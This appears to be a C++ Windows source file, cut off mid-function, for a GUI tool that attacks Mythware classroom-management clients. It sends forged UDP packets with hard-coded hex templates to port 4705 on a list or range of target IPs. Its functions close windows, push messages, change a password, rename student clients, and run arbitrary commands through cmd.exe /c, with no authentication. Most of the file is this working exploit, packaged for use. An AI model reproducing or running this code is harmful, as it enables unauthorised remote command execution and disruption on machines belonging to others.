#include "framework.h"
#include "mythware_controller.h"
#include <string>
#include <vector>
#include <random>
#include <thread>
#include <chrono>
#include <sstream>
#include <algorithm>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <fstream>
#include <atlconv.h> // CT2A
#include <atlstr.h> // CString 支持（使用 ATL CString）

#define MAX_LOADSTRING 100

#define CLOSE_WINDOW 1017
#define SEND_MESSAGE 1018
#define SEND_COMMAND 1019
#define IP_LIST_BOX 1020
#define ADDIP 1021
#define ADDIP2 1022
#define CLRIP 1023
#define DELIP 1024
#define CHANGE_PASSWORD 2001
#define CHANGE_NAME 2002

#pragma comment(lib,"ws2_32.lib")
using namespace std;

// 全局变量:
HINSTANCE hInst;                                // 当前实例
WCHAR szTitle[MAX_LOADSTRING];                  // 标题栏文本
WCHAR szWindowClass[MAX_LOADSTRING];            // 主窗口类名

// 全局随机数生成器
random_device rd;
mt19937 gen(rd());
uniform_int_distribution<> dis(56, 70);

// 此代码模块中包含的函数的前向声明:
ATOM                MyRegisterClass(HINSTANCE hInstance);
BOOL                InitInstance(HINSTANCE, int);
LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK AddIPDialog(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
INT_PTR CALLBACK AddMultipleIPDialog(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
INT_PTR CALLBACK SendMsgDialog(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
INT_PTR CALLBACK SendCmdDialog(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
INT_PTR CALLBACK ChangePasswordDialog(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
INT_PTR CALLBACK ChangeNameDialog(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);

bool CheckIP(const std::string& ip);
bool CheckIPf(const std::string& ip);
void AddIPs(const std::wstring& ip, const std::wstring& start, const std::wstring& end, HWND hDlg);// 添加多个IP地址
wstring CMD_WStrToHex(const std::wstring& cmd);
void WriteLogs(const std::string& logMessage);// 写入日志文件
void EnableMenus(bool flag);
//反控全部函数
void sendPacket(const wstring& targetIP, const string& hexData);
string generateHead();
string generateHead_pw();
string randomEnd();
void closeWindow(const wstring& targetIP);
string wstringToHex(const wstring& wstr);
void send_myth_Message(const wstring& targetIP, const wstring& msg);
string strToHex(const string& cmd);

vector<wstring> ipList; // 存储IP地址的列表

HWND hCloseWindow, hSendMessage, hSendCommand, hChangePassword, hChangeName;

// Helper: 将宽字符转换为 UTF-8 std::string，替代 CW2A
static string WideCharToUtf8(const wchar_t* wstr)
{
    if (wstr == nullptr) return std::string();
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr, -1, NULL, 0, NULL, NULL);
    if (size_needed <= 0) return std::string();
    std::string result(size_needed - 1, '\0'); // 不包含终止符
    WideCharToMultiByte(CP_UTF8, 0, wstr, -1, &result[0], size_needed, NULL, NULL);
    return result;
}

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPWSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);

    // TODO: 在此处放置代码。

    // 初始化全局字符串
    LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
    LoadStringW(hInstance, IDC_MYTHWARECONTROLLER, szWindowClass, MAX_LOADSTRING);
    MyRegisterClass(hInstance);

    // 执行应用程序初始化:
    if (!InitInstance (hInstance, nCmdShow))
    {
        return FALSE;
    }

    HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_MYTHWARECONTROLLER));

    MSG msg;

    // 主消息循环:
    while (GetMessage(&msg, nullptr, 0, 0))
    {
        if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

    return (int) msg.wParam;
}



//
//  函数: MyRegisterClass()
//
//  目标: 注册窗口类。
//
ATOM MyRegisterClass(HINSTANCE hInstance)
{
    WNDCLASSEXW wcex;

    wcex.cbSize = sizeof(WNDCLASSEX);

    wcex.style          = CS_HREDRAW | CS_VREDRAW;
    wcex.lpfnWndProc    = WndProc;
    wcex.cbClsExtra     = 0;
    wcex.cbWndExtra     = 0;
    wcex.hInstance      = hInstance;
    wcex.hIcon          = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_MYTHWARECONTROLLER));
    wcex.hCursor        = LoadCursor(nullptr, IDC_ARROW);
    wcex.hbrBackground  = (HBRUSH)(COLOR_WINDOW+1);
    wcex.lpszMenuName   = MAKEINTRESOURCEW(IDC_MYTHWARECONTROLLER);
    wcex.lpszClassName  = szWindowClass;
    wcex.hIconSm        = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

    return RegisterClassExW(&wcex);
}

//
//   函数: InitInstance(HINSTANCE, int)
//
//   目标: 保存实例句柄并创建主窗口
//
//   注释:
//
//        在此函数中，我们在全局变量中保存实例句柄并
//        创建和显示主程序窗口。
//
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
   hInst = hInstance; // 将实例句柄存储在全局变量中

   HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX | WS_VISIBLE,
	   CW_USEDEFAULT, 0, 500, 500, nullptr, nullptr, hInstance, nullptr);//窗口不能调整大小

   if (!hWnd)
   {
      return FALSE;
   }

   // 在 WM_CREATE 或 WM_INITDIALOG 中创建
   HWND hStatic = CreateWindow(L"STATIC", L"极域UDP反控软件",
       WS_CHILD | WS_VISIBLE | SS_LEFT,
       195, 10, 200, 25,  // x, y, 宽度, 高度
       hWnd, NULL, GetModuleHandle(NULL), NULL);

   //所有按键创建区域
   HWND close_Window = CreateWindowW(L"BUTTON", L"关闭窗口", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 50, 50, 100, 50, hWnd, (HMENU)CLOSE_WINDOW, hInstance, nullptr);
   HWND sendMessage = CreateWindowW(L"BUTTON", L"发送消息", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 200, 50, 100, 50, hWnd, (HMENU)SEND_MESSAGE, hInstance, nullptr);
   HWND sendCommand = CreateWindowW(L"BUTTON", L"发送cmd命令", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 350, 50, 100, 50, hWnd, (HMENU)SEND_COMMAND, hInstance, nullptr);
   HWND AddIP = CreateWindowW(L"BUTTON", L"添加一个ip", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 270, 200, 100, 25, hWnd, (HMENU)ADDIP, hInstance, nullptr);
   HWND AddIP2 = CreateWindowW(L"BUTTON", L"添加多个ip", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 270, 240, 100, 25, hWnd, (HMENU)ADDIP2, hInstance, nullptr);
   HWND DelIP = CreateWindowW(L"BUTTON", L"删除选中ip", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 270, 280, 100, 25, hWnd, (HMENU)DELIP, hInstance, nullptr);
   HWND ClrIP = CreateWindowW(L"BUTTON", L"清空所有ip", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 270, 320, 100, 25, hWnd, (HMENU)CLRIP, hInstance, nullptr);
   HWND ChangePassword = CreateWindowW(L"BUTTON", L"修改密码", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 50, 125, 100, 25, hWnd, (HMENU)CHANGE_PASSWORD, hInstance, nullptr);
   HWND ChangeName = CreateWindowW(L"BUTTON", L"学生端改名", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 200, 125, 100, 25, hWnd, (HMENU)CHANGE_NAME, hInstance, nullptr);

   //IP列表
   HWND IPListBox = CreateWindowW(L"LISTBOX", NULL,
       WS_CHILD | WS_VISIBLE | WS_BORDER | WS_VSCROLL | LBS_NOTIFY,
       50, 200, 200, 150,
       hWnd, (HMENU)IP_LIST_BOX, hInst, NULL);

   //字体创建区
   HFONT hFont = CreateFontW(20, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
       DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY,
       DEFAULT_PITCH | FF_DONTCARE, L"微软雅黑");
    SendMessage(close_Window, WM_SETFONT, (WPARAM)hFont, TRUE);
	SendMessage(sendMessage, WM_SETFONT, (WPARAM)hFont, TRUE);
    SendMessage(sendCommand, WM_SETFONT, (WPARAM)hFont, TRUE);
    SendMessage(AddIP, WM_SETFONT, (WPARAM)hFont, TRUE);
    SendMessage(AddIP2, WM_SETFONT, (WPARAM)hFont, TRUE);
    SendMessage(DelIP, WM_SETFONT, (WPARAM)hFont, TRUE);
    SendMessage(ClrIP, WM_SETFONT, (WPARAM)hFont, TRUE);
    SendMessage(ChangePassword, WM_SETFONT, (WPARAM)hFont, TRUE);
    SendMessage(IPListBox, WM_SETFONT, (WPARAM)hFont, TRUE);
    SendMessage(hStatic, WM_SETFONT, (WPARAM)hFont, TRUE);
    SendMessage(ChangeName, WM_SETFONT, (WPARAM)hFont, TRUE);

    //由全局变量接管句柄
    hCloseWindow = close_Window;
    hSendMessage = sendMessage;
    hSendCommand = sendCommand;
	hChangePassword = ChangePassword;
    hChangeName = ChangeName;

   ShowWindow(hWnd, nCmdShow);
   UpdateWindow(hWnd);

   return TRUE;
}

//
//  函数: WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  目标: 处理主窗口的消息。
//
//  WM_COMMAND  - 处理应用程序菜单
//  WM_PAINT    - 绘制主窗口
//  WM_DESTROY  - 发送退出消息并返回
//
//
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)
    {
    case WM_COMMAND:
        {
            int wmId = LOWORD(wParam);
            // 分析菜单选择:
            switch (wmId)
            {
            case IDM_ABOUT:
                DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About);
                break;
            case IDM_EXIT:
                DestroyWindow(hWnd);
                break;
            case ADDIP:
                DialogBox(hInst, MAKEINTRESOURCE(ADDIP_WIN), hWnd, AddIPDialog);
				break;
            case ADDIP2:
				DialogBox(hInst, MAKEINTRESOURCE(ADDIP2_WIN), hWnd, AddMultipleIPDialog);
                break;
            case DELIP:
                {
                    int selIndex = SendMessage(GetDlgItem(hWnd, IP_LIST_BOX), LB_GETCURSEL, 0, 0);
                    if (selIndex != LB_ERR)
                    {
                        SendMessage(GetDlgItem(hWnd, IP_LIST_BOX), LB_DELETESTRING, selIndex, 0);
                        ipList.erase(ipList.begin() + selIndex);
                    }
                }
				break;
            case CLRIP:
                SendMessage(GetDlgItem(hWnd, IP_LIST_BOX), LB_RESETCONTENT, 0, 0);
                ipList.clear();
				break;
			case CLOSE_WINDOW:
			{
                EnableMenus(0);
                if (!ipList.size()) {
                    MessageBoxW(hWnd, L"请先添加IP地址", L"提示", MB_ICONINFORMATION);
                    EnableMenus(1);
                    break;
                }
				for (int i = 0; i < ipList.size(); i++) {
					closeWindow(ipList[i]);
				}
                MessageBoxW(hWnd, L"发送完成，可到logs.txt查看日志", L"提示", MB_ICONINFORMATION);
                EnableMenus(1);
                break;
			}
			case SEND_MESSAGE:
            {
                DialogBox(hInst, MAKEINTRESOURCE(SENDMSG_WIN), hWnd, SendMsgDialog);
                break;
            }
            case SEND_COMMAND: {
                DialogBox(hInst, MAKEINTRESOURCE(SENDCMD_WIN), hWnd, SendCmdDialog);
                break;
            }
			case CHANGE_PASSWORD:
			{
				DialogBox(hInst, MAKEINTRESOURCE(CHANGEPASSWORD_WIN), hWnd, ChangePasswordDialog);
				break;
			}
            case CHANGE_NAME:
            {
                DialogBox(hInst, MAKEINTRESOURCE(CHANGENAME_WIN), hWnd, ChangeNameDialog);
                break;

            }
            default:
                return DefWindowProc(hWnd, message, wParam, lParam);
            }
        }
        break;
    case WM_PAINT:
        {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hWnd, &ps);
            // TODO: 在此处添加使用 hdc 的任何绘图代码...
            EndPaint(hWnd, &ps);
        }
        break;
    case WM_CTLCOLORSTATIC:
    {
        SetBkMode((HDC)wParam, TRANSPARENT);
        return (LRESULT)GetStockObject(HOLLOW_BRUSH);
    }
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProc(hWnd, message, wParam, lParam);
    }
    return 0;
}

bool CheckIP(const std::string& ip)
{
    struct sockaddr_in sa;
    int result = inet_pton(AF_INET, ip.c_str(), &(sa.sin_addr));
    return result == 1; // 返回true表示有效的IP地址
}



bool CheckIPf(const std::string& ip) 
{
    // 把传入的前缀或IP字符串补上一个数字用于验证（例如 "192.168.0." -> "192.168.0.1"）
    string ip2 = ip + "1";
    struct sockaddr_in sa;
    int result = inet_pton(AF_INET, ip2.c_str(), &(sa.sin_addr));
    return result == 1; // 返回true表示有效的IP地址
}

void AddIPs(const wstring& ip, const wstring& start, const wstring& end, HWND hDlg) 
{
    int s = stoi(start);
    int e = stoi(end);
    for (int i = s; i <= e; ++i) {
        wstring full = ip + to_wstring(i);
        ipList.push_back(full);
        // 将完整的宽字符串指针作为 LPARAM 传递给 LB_ADDSTRING
        SendMessage(GetDlgItem(GetParent(hDlg), IP_LIST_BOX), LB_ADDSTRING, 0, (LPARAM)full.c_str());
    }
}

void EnableMenus(bool flag) {
    if (flag) {
        EnableWindow(hCloseWindow, TRUE);
        EnableWindow(hSendMessage, TRUE);
        EnableWindow(hSendCommand, TRUE);
        EnableWindow(hChangePassword, TRUE);
        EnableWindow(hChangeName, TRUE);
    }
    else {
        EnableWindow(hCloseWindow, FALSE);
        EnableWindow(hSendMessage, FALSE);
        EnableWindow(hSendCommand, FALSE);
        EnableWindow(hChangePassword, FALSE);
        EnableWindow(hChangeName, FALSE);
    }
}

//写日志函数
void WriteLogs(const string& logMessage) {
	ofstream logFile("logs.txt", ios::app);
	if (logFile.is_open()) {
		// 获取当前时间
		auto now = chrono::system_clock::now();
		time_t now_time = chrono::system_clock::to_time_t(now);
		char timeStr[26];
		ctime_s(timeStr, sizeof(timeStr), &now_time);
		timeStr[strlen(timeStr) - 1] = '\0'; // 去掉换行符
		logFile << "[" << timeStr << "] " << logMessage << endl;
		logFile.close();
	}
}

void WriteLogsW(const wstring& logMessage) {
	// 将宽字符串转换为 UTF-8 并写入窄字节日志文件
	ofstream logFile("logs.txt", ios::app);
	if (logFile.is_open()) {
		// 获取当前时间
		auto now = chrono::system_clock::now();
		time_t now_time = chrono::system_clock::to_time_t(now);
		char timeStr[26];
		ctime_s(timeStr, sizeof(timeStr), &now_time);
		timeStr[strlen(timeStr) - 1] = '\0'; // 去掉换行符
		string msgUtf8 = WideCharToUtf8(logMessage.c_str());
		logFile << "[" << timeStr << "] " << msgUtf8 << endl;
		logFile.close();
	}
}
//反控类全部函数
// 字符串转十六进制（用于CMD命令）
wstring CMD_WStrToHex(const std::wstring& cmd)
{
    std::wstring result;
    for (wchar_t c : cmd) {
        wchar_t hex[5];  // 4位十六进制 + 结尾符
        swprintf_s(hex, 5, L"%04x", (unsigned int)c);
        result += hex;
        result += L"00";
    }
    return L"2f0063002000" + result;
}

string strToHex(const string& cmd) {
    string result;
    for (char c : cmd) {
        char hex[3];
        sprintf_s(hex, sizeof(hex), "%02x", (unsigned char)c);
        result += hex;
        result += "00";
    }
    return "2f0063002000" + result;
}

// 发送UDP数据包
void sendPacket(const wstring& targetIP, const string& hexData) {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

    sockaddr_in targetAddr;
    targetAddr.sin_family = AF_INET;
    targetAddr.sin_port = htons(4705);
    inet_pton(AF_INET, WideCharToUtf8(targetIP.c_str()).c_str(), &targetAddr.sin_addr);

    vector<unsigned char> binaryData;
    for (size_t i = 0; i < hexData.length(); i += 2) {
        string byteStr = hexData.substr(i, 2);
        unsigned char byte = (unsigned char)strtol(byteStr.c_str(), nullptr, 16);
        binaryData.push_back(byte);
    }

    int sent = sendto(sock, (const char*)binaryData.data(), binaryData.size(),
        0, (sockaddr*)&targetAddr, sizeof(targetAddr));

    if (sent != SOCKET_ERROR) {
        //cout << "发送成功: " << targetIP << " (" << sent << "字节)" << endl;
		//MessageBoxW(NULL, L"发送成功!", L"提示", MB_OK | MB_ICONINFORMATION);
		WriteLogsW(L"successfully sent to " + targetIP + L" (" + to_wstring(sent) + L" bytes)");
    }
    else {
        //cerr << "发送失败: " << targetIP << " 错误码:" <<  << endl;
		//MessageBoxW(NULL, L"发送失败!", L"提示", MB_OK | MB_ICONERROR);
		WriteLogsW(L"failed to send to " + targetIP + L" error code: " + to_wstring(WSAGetLastError()));
    }

    closesocket(sock);
    WSACleanup();
}


//随机头部生成函数
string generateHead() {
    return "444d4f43000001006e030000" +
        to_string(dis(gen)) + to_string(dis(gen)) +
        "0000" +
        to_string(dis(gen)) + to_string(dis(gen)) + to_string(dis(gen));
}

string generateHead_pw() {
    string rs;
	rs += "444d4f430000010095000000";
	for (int i = 1; i <= 16; i++) {
		rs += to_string(dis(gen));
	}
	/*return "444d4f430000010095000000" +
		to_string(dis(gen)) + to_string(dis(gen)) +
		"0000" +
		to_string(dis(gen)) + to_string(dis(gen)) + to_string(dis(gen));*/
	return rs;
}

string randomEnd() {
	const string randomStr[3] = {"00006c005300650074005c0043006f006e00740072006f006c005c004e006500740077006f0072006b00",
    "000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
    "00001e16e102023421160000a046000020419a99993fa005100001000000000000000000000000000000"};
    return randomStr[dis(gen) % 3];
}

// 关闭窗口函数
void closeWindow(const wstring& targetIP) {
    string head = generateHead();
    // targetIP is wide string; sendPacket expects wstring for IP and narrow string for hex data
    string message = head +
        "000000000000000000204e0000c0a8019b610300006103000000020000000000000e0000000000000001000000e102020ba615e102020ca9150100112b0000100001000000010000005e010000000000000200000000500000a005000001000000190000004b00000000000000c0a8019b040000000c00000010000000000000002003e00100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000049f47ac5a8ed19009f93410088aa560018f51900d8ed1900ae95410018f51900fb03000000000000d02d40000000000039000000000000000000000018f51900fb030000fced190050304f00fb030000000000000000000000000000fb03000018f51900000000004cee1900ac764100fb03000000000000000000000000000018f5190018f5190011010000116000801a0808000c819677c8260e01b0260e016d19abb111600080c0439777420300000000000018f5190060ee19008fe14000000000005405030018f5190018ef190014804100fb03000054050300c9f67ac51101000018f51900504205011a08080018ef1900ed5ed17552d414861a08080018ef190040519a0154050300000000002101000000000000908996010c2000000100000000ef19009735d17540519a01000000002c64abcf150200000000000000000000000000000c64abcf000000000000000050420501e8195900041a5900a062d375bc1b6aba14ef1900db294200ffffff7f00000000a0ef1900930853000000000038ef19009236410011010000fb0300005405030034ef190018f5190000000000acef1900396b410011010000fb030000540503007df67ac511010000ae060c00926b41001a08080011010000110400003c0405000000000000000000000000007c145300ffffffff5042050100000000000000000000000000000000000000007df67ac54cef1900ccf019007f07530000000000ccef1900c86b410018f51900ae060c0011010000fb0300005405030000000000f8ef19008b43d375ae060c0011010000fb0300005405030000000000cdabbadc926b41001101000000000000dcf019008c4fd175926b4100ae060c0011010000fb03000054050300f07babcf000000001095980100000040c07babcf0000000040519a012400000001000000000000000000000070000000ffffffffffffffffdb4dd1753152d1750000";
    sendPacket(targetIP, message);
}

string wstringToHex(const wstring& wstr) {
    string result;
    for (wchar_t wc : wstr) {
        unsigned char low = static_cast<unsigned char>(wc & 0xFF);
        unsigned char high = static_cast<unsigned char>((wc >> 8) & 0xFF);
        char hex[5];
        sprintf_s(hex, sizeof(hex), "%02x%02x", low, high);
        result += hex;
    }
    return result;
}

//发送消息函数
void send_myth_Message(const wstring& targetIP, const wstring& msg) {
    // 1. 生成头部（用 string）
    string head = generateHead();

    // 2. 消息内容转十六进制（用 string）
    string msgHex = wstringToHex(msg);

    // 3. 构造完整数据包（全程用 string）
    string packet = head +
        "000000000000000000204e0000c0a88e019103000091030000000800000000000005000000" +
        msgHex;

    // 4. 补齐到 2076 个十六进制字符
    while (packet.length() < 2076) {
        packet += "00";
    }

    // 5. 发送（targetIP 仍用 wstring，但 packet 是 string）
    sendPacket(targetIP, packet);
}
// “关于”框的消息处理程序。
INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
    UNREFERENCED_PARAMETER(lParam);
    
    switch (message)
    {
    case WM_INITDIALOG:
    {
        HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(IDR_ATEXT1), L"ATEXT");
        if (hRes == NULL) {
            MessageBoxW(NULL, L"无法找到资源文件！", L"错误", MB_ICONERROR);
            EndDialog(hDlg, LOWORD(wParam));
            return (INT_PTR)FALSE;
        }

        HGLOBAL hGlobal = LoadResource(NULL, hRes);
        if (hGlobal == NULL) {
            EndDialog(hDlg, LOWORD(wParam));
            return (INT_PTR)FALSE;
        }

        char* pText = (char*)LockResource(hGlobal);
        DWORD dwSize = SizeofResource(NULL, hRes);

        // 资源可能不是以 null 结尾，所以用 string 按大小拷贝数据
        string s(pText, pText + dwSize);
        // 先尝试按 UTF-8 解码为宽字符串，失败时回退到 ANSI (CP_ACP)
        int wideLen = MultiByteToWideChar(CP_UTF8, 0, s.data(), (int)dwSize, NULL, 0);
        wstring wstr;
        if (wideLen > 0) {
            wstr.resize(wideLen);
            MultiByteToWideChar(CP_UTF8, 0, s.data(), (int)dwSize, &wstr[0], wideLen);
        } else {
            wideLen = MultiByteToWideChar(CP_ACP, 0, s.data(), (int)dwSize, NULL, 0);
            if (wideLen > 0) {
                wstr.resize(wideLen);
                MultiByteToWideChar(CP_ACP, 0, s.data(), (int)dwSize, &wstr[0], wideLen);
            }
        }
        SetDlgItemTextW(hDlg, EDIT_README, wstr.c_str());
        return (INT_PTR)TRUE;
    }
    case WM_COMMAND:
        if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)
        {
            EndDialog(hDlg, LOWORD(wParam));
            return (INT_PTR)TRUE;
        }
        break;
    }
    return (INT_PTR)FALSE;
}

//添加一个IP地址窗口
INT_PTR CALLBACK AddIPDialog(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
    UNREFERENCED_PARAMETER(lParam);
    switch (message)
    {
    case WM_INITDIALOG:
        return (INT_PTR)TRUE;
    case WM_COMMAND:
        
        if (LOWORD(wParam) == ADDIP_WIN_OK)
        {
            wchar_t ipBuffer[16];
            GetDlgItemText(hDlg, ADDIP_WIN_EDIT, ipBuffer, 16);
            // 使用自定义转换函数替代未定义的 CW2A
            string ipAddress = WideCharToUtf8(ipBuffer);
            // 验证IP地址格式
            
			int result = CheckIP(ipAddress);
            if (result == 1) // 有效的IP地址
            {
                ipList.push_back(ipBuffer);
				SendMessage(GetDlgItem(GetParent(hDlg), IP_LIST_BOX), LB_ADDSTRING, 0, (LPARAM)ipBuffer);
                EndDialog(hDlg, LOWORD(wParam));
                return (INT_PTR)TRUE;
            }
            else
            {
                MessageBox(hDlg, L"请输入有效的IP地址！", L"错误", MB_ICONERROR);
                return (INT_PTR)FALSE;
            }
        }
        else if (LOWORD(wParam) == ADDIP_WIN_CANCEL)
        {
            EndDialog(hDlg, LOWORD(wParam));
            return (INT_PTR)TRUE;
        }
        break;
    }
    return (INT_PTR)FALSE;
}

INT_PTR CALLBACK AddMultipleIPDialog(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
    UNREFERENCED_PARAMETER(lParam);
    switch (message)
    {
    case WM_INITDIALOG:
        return (INT_PTR)TRUE;
    case WM_COMMAND:
        if (LOWORD(wParam) == ADDIP2_WIN_OK)
        {
            wchar_t ipBuffer[16], startBuf[16], endBuf[16];
            GetDlgItemText(hDlg, ADDIP2_WIN_EDIT, ipBuffer, 16);
            GetDlgItemText(hDlg, ADDIP2_WIN_EDIT_START, startBuf, 16);
            GetDlgItemText(hDlg, ADDIP2_WIN_EDIT_END, endBuf, 16);
            if (ipBuffer[0] == L'\0' || startBuf[0] == L'\0' || endBuf[0] == L'\0') {
                MessageBoxW(hDlg, L"内容无效", L"提示", MB_ICONERROR);
                return (INT_PTR)FALSE;
            }
            string ipAddress = WideCharToUtf8(ipBuffer);
            string start = WideCharToUtf8(startBuf);
            string end = WideCharToUtf8(endBuf);
            //检查起始是否大于末尾数字，是就报错
            if (stoi(start) >= stoi(end)) {
                MessageBox(hDlg, L"起始数字不得大于末尾数字！！！", L"错误", MB_ICONERROR);
                return (INT_PTR)FALSE;
            }
            int result = CheckIPf(ipAddress);
            if (result == 1) // 有效的IP地址
            {
                //批量添加ip
				AddIPs(ipBuffer, startBuf, endBuf, hDlg);
                EndDialog(hDlg, LOWORD(wParam));
                return (INT_PTR)TRUE;
            }
            else
            {
                MessageBox(hDlg, L"请输入有效的IP地址！", L"错误", MB_ICONERROR);
                return (INT_PTR)FALSE;
            }
        }
        else if (LOWORD(wParam) == ADDIP2_WIN_CANCEL)
        {
            EndDialog(hDlg, LOWORD(wParam));
            return (INT_PTR)TRUE;
        }
        break;
    }
    return (INT_PTR)FALSE;
}
INT_PTR CALLBACK SendMsgDialog(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam) {
    UNREFERENCED_PARAMETER(lParam);
    switch (message) {
    case WM_INITDIALOG: {
        // 限制编辑框最多 1024 个字符
        SendDlgItemMessage(hDlg, SENDMSG_WIN_EDIT, EM_SETLIMITTEXT, 1024, 0);
        return (INT_PTR)TRUE;
    }
    case WM_COMMAND: {
        switch (LOWORD(wParam)) {
        case SENDMSG_WIN_CANCEL: {
            EndDialog(hDlg, LOWORD(wParam));
            return (INT_PTR)TRUE;
        }
        case SENDMSG_WIN_OK: {
            if (!ipList.size()) {
                MessageBoxW(hDlg, L"请先添加IP地址", L"提示", MB_ICONINFORMATION);
                return (INT_PTR)FALSE;
            }
            wchar_t msgBuffer[1025];
            GetDlgItemText(hDlg, SENDMSG_WIN_EDIT, msgBuffer, 1025);
            wstring messageToSend(msgBuffer);
            for (const auto& ip : ipList) {
                send_myth_Message(ip, messageToSend);
            }
            MessageBoxW(hDlg, L"发送完成，可到logs.txt查看日志", L"提示", MB_ICONINFORMATION);
            EndDialog(hDlg, LOWORD(wParam));
            return (INT_PTR)TRUE;
        }
        }
    }
    }
    return (INT_PTR)FALSE;
}

INT_PTR CALLBACK SendCmdDialog(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam) {
	UNREFERENCED_PARAMETER(lParam);
	switch (message) {
	case WM_INITDIALOG: {
		// 限制编辑框最多 1024 个字符
		SendDlgItemMessage(hDlg, SENDCMD_WIN_EDIT, EM_SETLIMITTEXT, 1024, 0);
		return (INT_PTR)TRUE;
	}
	case WM_COMMAND: {
		switch (LOWORD(wParam)) {
		case SENDCMD_WIN_CANCEL: {
			EndDialog(hDlg, LOWORD(wParam));
			return (INT_PTR)TRUE;
		}
		case SENDCMD_WIN_OK: {
            if (!ipList.size()) {
                MessageBoxW(hDlg, L"请先添加IP地址", L"提示", MB_ICONINFORMATION);
                return (INT_PTR)FALSE;
            }
			char cmdBuffer[1025];
			GetDlgItemTextA(hDlg, SENDCMD_WIN_EDIT, cmdBuffer, 1025);
			string commandToSend(cmdBuffer);// 获取用户输入的命令
			string hexCommand = strToHex(commandToSend);
            string head = generateHead();
            string MsgHex = head + "000000000000000000204e0000c0a88e01610300006103000000020000000000000f0000000100000043003a005c00570069006e0064006f00770073005c00730079007300740065006d00330032005c0063006d0064002e006500780065000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" + hexCommand;
            while (MsgHex.length() < 2076) {
                MsgHex += "00";
            }
			for (const auto& ip : ipList) {
				sendPacket(ip, MsgHex);
			}
            MessageBoxW(hDlg, L"发送完成，可到logs.txt查看日志", L"提示", MB_ICONINFORMATION);
			EndDialog(hDlg, LOWORD(wParam));
			return (INT_PTR)TRUE;
		}
		}
	}
	}
	return (INT_PTR)FALSE;
}

INT_PTR CALLBACK ChangePasswordDialog(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam) {
    UNREFERENCED_PARAMETER(lParam);
    switch (message) {
    case WM_INITDIALOG: {
        // 限制编辑框最多 1024 个字符
        SendDlgItemMessage(hDlg, CHANGEPASSWORD_WIN_EDIT, EM_SETLIMITTEXT, 1024, 0);
        return (INT_PTR)TRUE;
    }
    case WM_COMMAND: {
        switch (LOWORD(wParam)) {
        case CHANGEPASSWORD_WIN_CANCEL: {
            EndDialog(hDlg, LOWORD(wParam));
            return (INT_PTR)TRUE;
        }
        case CHANGEPASSWORD_WIN_OK: {
            if (!ipList.size()) {
                MessageBoxW(hDlg, L"请先添加IP地址", L"提示", MB_ICONINFORMATION);
                return (INT_PTR)FALSE;
            }
            wchar_t passwordBuffer[1025];
            GetDlgItemText(hDlg, CHANGEPASSWORD_WIN_EDIT, passwordBuffer, 1025);
			if (passwordBuffer[0] == L'\0') {
